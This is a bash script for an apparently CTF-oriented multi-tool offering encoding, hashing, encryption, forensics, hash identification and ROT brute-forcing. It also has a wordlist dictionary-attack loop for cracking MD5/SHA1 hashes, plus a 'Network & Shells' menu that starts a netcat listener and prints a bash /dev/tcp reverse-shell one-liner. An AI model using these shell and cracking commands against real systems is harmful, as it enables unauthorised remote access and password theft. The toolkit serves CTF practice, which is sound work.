#!/bin/bash

# ===============================================
# CTF All-Rounder Toolkit v1.0.0
# Features: Cryptanalysis (ID & Brute-force),
#           Output Folder, Dual Display, Smart Input
# ====================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Configuration
OUTPUT_DIR="ctf_output"
TEMP_FILE=".ctf_temp_buffer"
IS_TEMP=0

mkdir -p "$OUTPUT_DIR"

# ==========================================
# UTILITIES
# ===========================================

pause() {
    echo ""
    read -p "Press [Enter] to continue..."
}

cleanup() {
    if [ "$IS_TEMP" -eq 1 ]; then
        rm -f "$TEMP_FILE" 2>/dev/null
        IS_TEMP=0
    fi
}

get_output_path() {
    local ext="$1"
    local base_name
    if [ "$IS_TEMP" -eq 1 ]; then
        base_name="text_input_$(date +%H%M%S)"
    else
        base_name=$(basename "$TARGET")
    fi
    echo "${OUTPUT_DIR}/${base_name}.${ext}"
}

get_input() {
    echo -e "${CYAN}--- Input Source ---${NC}"
    echo "1. Select a File"
    echo "2. Type Text Directly"
    read -p "Choose [1 or 2]: " src_opt

    if [ "$src_opt" == "2" ]; then
        echo -e "${YELLOW}Enter your text below:${NC}"
        read -r user_text
        echo -n "$user_text" > "$TEMP_FILE"
        TARGET="$TEMP_FILE"
        IS_TEMP=1
    else
        read -p "Enter filename: " f
        if [ ! -f "$f" ]; then
            echo -e "${RED}Error: File '$f' not found!${NC}"
            return 1
        fi
        TARGET="$f"
        IS_TEMP=0
    fi
    return 0
}

# ============================================
# 1. ENCODING
# ==========================================
menu_encoding() {
    while true; do
        cleanup
        clear
        echo -e "${CYAN}=== ENCODING & CIPHERS ===${NC}"
        echo "1. Base64 Encode/Decode"
        echo "2. Base32 Encode/Decode"
        echo "3. Hex Encode/Decode"
        echo "4. URL Decode"
        echo "5. Back"
        echo -e "${CYAN}==================================${NC}"
        read -p "Select: " opt
        [ "$opt" == "5" ] && return
        
        get_input || { pause; continue; }
        echo -e "\n${GREEN}>>> Output:${NC}"

        case $opt in
            1) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "decoded_b64")
                   base64 -d "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "b64")
                   base64 "$TARGET" | tee "$OUT"
               fi ;;
            2) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "decoded_b32")
                   base32 -d "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "b32")
                   base32 "$TARGET" | tee "$OUT"
               fi ;;
            3) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "bin")
                   xxd -r -p "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "hex")
                   xxd -p "$TARGET" | tee "$OUT"
               fi ;;
            4) 
               OUT=$(get_output_path "urldecoded")
               cat "$TARGET" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" | tee "$OUT" ;;
        esac
        echo -e "\n\n${YELLOW}[Saved to: $OUT]${NC}"
        pause
    done
}

# ==========================================
# 2. HASHING
# ==========================================
menu_hashing() {
    while true; do
        cleanup
        clear
        echo -e "${YELLOW}=== HASHING ===${NC}"
        echo "1. Calculate MD5 / SHA1 / SHA256"
        echo "2. Back"
        echo -e "${YELLOW}===============${NC}"
        read -p "Select: " opt
        [ "$opt" == "2" ] && return
        get_input || { pause; continue; }
        
        OUT=$(get_output_path "hashes")
        {
            echo "--- MD5 ---"; md5sum "$TARGET"
            echo "--- SHA1 ---"; sha1sum "$TARGET"
            echo "--- SHA256 ---"; sha256sum "$TARGET"
        } | tee "$OUT"
        
        echo -e "\n${YELLOW}[Saved to: $OUT]${NC}"
        pause
    done
}

# ==========================================
# 3. ENCRYPTION
# ==========================================
menu_encryption() {
    while true; do
        cleanup
        clear
        echo -e "${BLUE}=== ENCRYPTION (AES/GPG) ===${NC}"
        echo "1. AES-256 Encrypt"
        echo "2. AES-256 Decrypt"
        echo "3. GPG Encrypt"
        echo "4. GPG Decrypt"
        echo "5. Back"
        echo -e "${BLUE}============================${NC}"
        read -p "Select: " opt
        [ "$opt" == "5" ] && return
        get_input || { pause; continue; }

        case $opt in
            1) OUT=$(get_output_path "enc"); openssl enc -aes-256-cbc -salt -pbkdf2 -in "$TARGET" -out "$OUT"; echo -e "${GREEN}Saved to $OUT${NC}" ;;
            2) OUT=$(get_output_path "dec"); openssl enc -d -aes-256-cbc -pbkdf2 -in "$TARGET" -out "$OUT"; echo -e "${GREEN}Saved to $OUT${NC}" ;;
            3) read -p "Recipient: " r; OUT=$(get_output_path "gpg"); gpg -o "$OUT" -e -r "$r" "$TARGET"; echo -e "${GREEN}Saved to $OUT${NC}" ;;
            4) OUT=$(get_output_path "dec_gpg"); gpg -d "$TARGET" > "$OUT"; echo -e "${GREEN}Saved to $OUT${NC}" ;;
        esac
        pause
    done
}

# ==========================================
# 4. FORENSICS
# ==========================================
menu_forensics() {
    while true; do
        cleanup
        clear
        echo -e "${RED}=== FORENSICS ===${NC}"
        echo "1. Identify File (Magic Bytes)"
        echo "2. Strings"
        echo "3. Binwalk"
        echo "4. Back"
        echo -e "${RED}=================${NC}"
        read -p "Select: " opt
        [ "$opt" == "4" ] && return
        get_input || { pause; continue; }

        case $opt in
            1) file "$TARGET" ;;
            2) strings -n 6 "$TARGET" | head -n 20 ;;
            3) binwalk "$TARGET" ;;
        esac
        pause
    done
}

# ==========================================
# 5. CRYPTANALYSIS (NEW!)
# ==========================================
menu_analysis() {
    while true; do
        cleanup
        clear
        echo -e "${PURPLE}=== CRYPTANALYSIS (ID & BRUTE-FORCE) ===${NC}"
        echo "1. Identify Hash/Encoding Type"
        echo "2. Brute-Force: Caesar/ROT (All 26 shifts)"
        echo "3. Brute-Force: Dictionary Attack (MD5/SHA1)"
        echo "4. Back"
        echo -e "${PURPLE}========================================${NC}"
        read -p "Select: " opt
        [ "$opt" == "4" ] && return
        
        get_input || { pause; continue; }
        CONTENT=$(cat "$TARGET")
        LEN=${#CONTENT}

        case $opt in
            1) 
                echo -e "\n${GREEN}--- Analysis Report ---${NC}"
                echo "Length: $LEN chars"
                echo "Sample: ${CONTENT:0:20}..."
                echo -e "${CYAN}Possible Types:${NC}"
                
                # Simple Heuristic Check
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{32}$ ]]; then echo "[+] MD5 Hash"; fi
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{40}$ ]]; then echo "[+] SHA1 Hash"; fi
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{64}$ ]]; then echo "[+] SHA256 Hash"; fi
                if [[ "$CONTENT" =~ ^[a-zA-Z0-9+/]*={0,2}$ ]] && (( LEN % 4 == 0 )); then echo "[+] Base64 Encoded String"; fi
                if [[ "$CONTENT" =~ ^[a-zA-Z0-9]*$ ]] && [[ "$LEN" -eq 32 ]]; then echo "[+] Possible Base32"; fi
                
                echo -e "\n(Tip: If installed, use 'hashid' for detailed analysis)"
                ;;
            
            2)
                OUT=$(get_output_path "rot_bruteforce.txt")
                echo -e "${GREEN}Attempting all 26 rotations...${NC}"
                python3 -c "
import sys
s = sys.stdin.read().strip()
for i in range(1, 27):
    result = ''
    for c in s:
        if c.isalpha():
            base = 65 if c.isupper() else 97
            result += chr((ord(c) - base + i) % 26 + base)
        else:
            result += c
    print(f'ROT{i:02d}: {result}')
" < "$TARGET" | tee "$OUT"
                echo -e "\n${YELLOW}[Results saved to $OUT]${NC}"
                ;;
                
            3)
                echo -e "${RED}--- Dictionary Attack (Wordlist) ---${NC}"
                read -p "Enter path to wordlist (e.g. rockyou.txt): " wordlist
                if [ ! -f "$wordlist" ]; then echo "Wordlist not found."; pause; continue; fi
                
                read -p "Select Type [1] MD5  [2] SHA1: " htype
                echo -e "${GREEN}Cracking... (Ctrl+C to abort)${NC}"
                
                found=0
                while read -r word; do
                    # Pure bash hashing (slow but works without dependencies)
                    if [ "$htype" == "1" ]; then
                        h=$(echo -n "$word" | md5sum | awk '{print $1}')
                    else
                        h=$(echo -n "$word" | sha1sum | awk '{print $1}')
                    fi
                    
                    if [ "$h" == "$CONTENT" ]; then
                        echo -e "\n${GREEN}!!! PASSWORD FOUND !!!${NC}"
                        echo -e "Hash: $CONTENT"
                        echo -e "Plaintext: $word"
                        found=1
                        break
                    fi
                done < "$wordlist"
                
                if [ $found -eq 0 ]; then echo -e "\n${RED}Password not found in wordlist.${NC}"; fi
                ;;
        esac
        pause
    done
}

# ==========================================
# 6. NETWORK & SHELLS
# ==========================================
menu_network() {
    while true; do
        clear
        echo -e "${PURPLE}=== NETWORK & SHELLS ===${NC}"
        echo "1. Start Netcat Listener"
        echo "2. Generate Reverse Shells"
        echo "3. Get IP"
        echo "4. Back"
        echo -e "${PURPLE}========================${NC}"
        read -p "Select: " opt
        case $opt in
            1) read -p "Port: " p; nc -lvnp "$p"; pause ;;
            2) read -p "LHOST: " lh; read -p "LPORT: " lp; 
               echo "bash -i >& /dev/tcp/$lh/$lp 0>&1"; pause ;;
            3) ip -c addr; pause ;;
            4) return ;;
        esac
    done
}

# ==========================================
# MAIN LOOP
# ==========================================
trap cleanup EXIT
while true; do
    clear
    echo -e "${GREEN}###############################################${NC}"
    echo -e "${GREEN}#                HOTROD v1.0.0                #${NC}"
    echo -e "${GREEN}#            CTF SWISS ARMY KNIFE             #${NC}"
    echo -e "${GREEN}#  MORE TOOLS: https://github.com/PS-003R32/  #${NC}"
    echo -e "${GREEN}#       Outputs saved to: ./ctf_output/       #${NC}"
    echo -e "${GREEN}###############################################${NC}"
    echo "1. Encoding & Ciphers"
    echo "2. Hashing Utilities"
    echo "3. Encryption (AES/GPG)"
    echo "4. File Forensics"
    echo "5. Cryptanalysis (ID & Brute-force)"
    echo "6. Network & Shells"
    echo "7. Exit"
    echo -e "${GREEN}---------------------------------------------${NC}"
    read -p "Select Module [1-7]: " choice

    case $choice in
        1) menu_encoding ;;
        2) menu_hashing ;;
        3) menu_encryption ;;
        4) menu_forensics ;;
        5) menu_analysis ;;
        6) menu_network ;;
        7) cleanup; exit 0 ;;
        *) echo "Invalid option." ;;
    esac
done
